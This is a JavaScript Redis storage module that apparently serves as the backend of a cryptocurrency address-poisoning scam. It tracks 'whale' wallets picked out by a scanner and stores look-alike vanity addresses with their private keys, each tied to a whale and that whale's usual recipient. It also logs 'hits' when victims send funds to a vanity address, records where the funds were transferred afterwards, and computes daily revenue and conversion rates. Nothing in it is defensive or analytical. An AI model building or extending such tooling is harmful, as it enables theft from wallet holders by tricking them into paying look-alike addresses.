import { redis } from './redis.js';

// ══════════════════════════════════════════════════════
//  TABLE 1 — targets:{chain}:{address}
//  Whale targets detected by scanner
// ══════════════════════════════════════════════════════

export async function saveTarget(chain, address, data) {
  const key = `targets:${chain}:${address.toLowerCase()}`;
  await redis.hset(key, {
    balance: data.balance?.toString() || '0',
    lastTxTo: data.lastTxTo?.toLowerCase() || '',
    txCount: data.txCount?.toString() || '0',
    isRecurrent: data.isRecurrent ? 'true' : 'false',
    lastTestTx: data.lastTestTx || '',
    score: data.score?.toString() || '0',
    chain,
    updatedAt: new Date().toISOString(),
  });
  await redis.sadd('targets:all', `${chain}:${address.toLowerCase()}`);
}

export async function getTarget(chain, address) {
  const key = `targets:${chain}:${address.toLowerCase()}`;
  const data = await redis.hgetall(key);
  if (!data || !data.chain) return null;
  return {
    ...data,
    balance: parseFloat(data.balance),
    txCount: parseInt(data.txCount),
    isRecurrent: data.isRecurrent === 'true',
    score: parseInt(data.score),
  };
}

export async function getAllTargets() {
  const keys = await redis.smembers('targets:all');
  const results = [];
  for (const k of keys) {
    const [chain, address] = k.split(':');
    const data = await getTarget(chain, address);
    if (data) results.push({ address, ...data });
  }
  return results;
}

// ══════════════════════════════════════════════════════
//  TABLE 2 — vanity:{address}
//  Generated vanity addresses
// ══════════════════════════════════════════════════════

export async function saveVanity(vanityAddress, data) {
  const key = `vanity:${vanityAddress.toLowerCase()}`;
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
  await redis.hset(key, {
    privateKey: data.privateKey, // already encrypted
    whale: data.whale?.toLowerCase() || '',
    recipient: data.recipient?.toLowerCase() || '',
    chain: data.chain,
    createdAt: new Date().toISOString(),
    matchChars: data.matchChars || '4+4',
    txHashes: JSON.stringify(data.txHashes || []),
    status: 'active',
    expiresAt,
  });
  await redis.sadd('vanity:all', vanityAddress.toLowerCase());
  // Auto-expire after 7 days
  await redis.expire(key, 7 * 24 * 60 * 60);
}

export async function getVanity(vanityAddress) {
  const key = `vanity:${vanityAddress.toLowerCase()}`;
  const data = await redis.hgetall(key);
  if (!data || !data.chain) return null;
  return {
    ...data,
    txHashes: JSON.parse(data.txHashes || '[]'),
  };
}

export async function updateVanityStatus(vanityAddress, status) {
  const key = `vanity:${vanityAddress.toLowerCase()}`;
  await redis.hset(key, 'status', status);
}

export async function addVanityTxHash(vanityAddress, txHash) {
  const key = `vanity:${vanityAddress.toLowerCase()}`;
  const current = await redis.hget(key, 'txHashes');
  const hashes = JSON.parse(current || '[]');
  hashes.push(txHash);
  await redis.hset(key, 'txHashes', JSON.stringify(hashes));
}

export async function getAllVanities(statusFilter) {
  const keys = await redis.smembers('vanity:all');
  const results = [];
  for (const addr of keys) {
    const data = await getVanity(addr);
    if (data && (!statusFilter || data.status === statusFilter)) {
      results.push({ address: addr, ...data });
    }
  }
  return results;
}

// ══════════════════════════════════════════════════════
//  TABLE 3 — hits:{id}
//  Successful hits (funds received on vanity address)
// ══════════════════════════════════════════════════════

export async function saveHit(data) {
  const id = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const key = `hits:${id}`;
  await redis.hset(key, {
    vanityAddress: data.vanityAddress?.toLowerCase() || '',
    whale: data.whale?.toLowerCase() || '',
    amount: data.amount?.toString() || '0',
    token: data.token || 'native',
    chain: data.chain,
    txHash: data.txHash || '',
    timestamp: new Date().toISOString(),
    transferredTo: data.transferredTo?.toLowerCase() || '',
    transferTxHash: data.transferTxHash || '',
  });
  await redis.sadd('hits:all', id);
  await redis.incr('hits:count');

  // Update vanity status to "hit"
  if (data.vanityAddress) {
    await updateVanityStatus(data.vanityAddress, 'hit');
  }

  // Update daily stats
  await incrementDailyStat('hits', 1);
  if (data.amount) {
    await incrementDailyStat('revenue', parseFloat(data.amount));
  }

  return id;
}

export async function getHit(id) {
  const key = `hits:${id}`;
  const data = await redis.hgetall(key);
  if (!data || !data.chain) return null;
  return { id, ...data, amount: parseFloat(data.amount) };
}

export async function updateHitTransfer(id, transferredTo, transferTxHash) {
  const key = `hits:${id}`;
  await redis.hset(key, {
    transferredTo: transferredTo.toLowerCase(),
    transferTxHash,
  });
}

export async function getAllHits() {
  const ids = await redis.smembers('hits:all');
  const results = [];
  for (const id of ids) {
    const data = await getHit(id);
    if (data) results.push(data);
  }
  return results.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
}

// ══════════════════════════════════════════════════════
//  TABLE 4 — stats:daily:{date}
//  Daily statistics
// ══════════════════════════════════════════════════════

function todayKey() {
  return `stats:daily:${new Date().toISOString().slice(0, 10)}`;
}

export async function incrementDailyStat(field, amount = 1) {
  const key = todayKey();
  if (Number.isInteger(amount)) {
    await redis.hincrby(key, field, amount);
  } else {
    await redis.hincrbyfloat(key, field, amount);
  }
  // Expire after 90 days
  await redis.expire(key, 90 * 24 * 60 * 60);
}

export async function getDailyStats(date) {
  const d = date || new Date().toISOString().slice(0, 10);
  const key = `stats:daily:${d}`;
  const data = await redis.hgetall(key);
  if (!data || Object.keys(data).length === 0) {
    return { date: d, scored: 0, sent: 0, hits: 0, gasSpent: 0, revenue: 0, conversionRate: 0 };
  }
  const scored = parseInt(data.scored || '0');
  const sent = parseInt(data.sent || '0');
  const hits = parseInt(data.hits || '0');
  const gasSpent = parseFloat(data.gasSpent || '0');
  const revenue = parseFloat(data.revenue || '0');
  return {
    date: d,
    scored,
    sent,
    hits,
    gasSpent: Math.round(gasSpent * 100) / 100,
    revenue: Math.round(revenue * 100) / 100,
    conversionRate: sent > 0 ? Math.round((hits / sent) * 10000) / 100 : 0,
  };
}

export async function getStatsRange(days = 7) {
  const results = [];
  for (let i = 0; i < days; i++) {
    const d = new Date(Date.now() - i * 24 * 60 * 60 * 1000).toISOString().slice(0, 10);
    results.push(await getDailyStats(d));
  }
  return results;
}
